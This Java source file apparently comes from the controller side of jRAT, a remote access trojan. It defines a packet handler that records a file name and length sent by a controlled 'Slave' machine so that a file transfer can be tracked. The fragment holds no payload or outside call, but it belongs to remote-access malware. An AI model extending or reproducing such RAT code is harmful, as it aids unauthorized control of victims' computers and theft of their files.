package jrat.controller.packets.incoming;

import jrat.common.io.FileCache;
import jrat.common.io.TransferData;
import jrat.controller.Slave;


public class Packet30BeginServerDownload extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String file = slave.readLine();
		long length = slave.readLong();
		
		TransferData data = FileCache.get(file);

		if (data != null) {
			data.setRemoteFile(file);
			data.setTotal(length);
			data.setObject(slave);
		}
	}

}
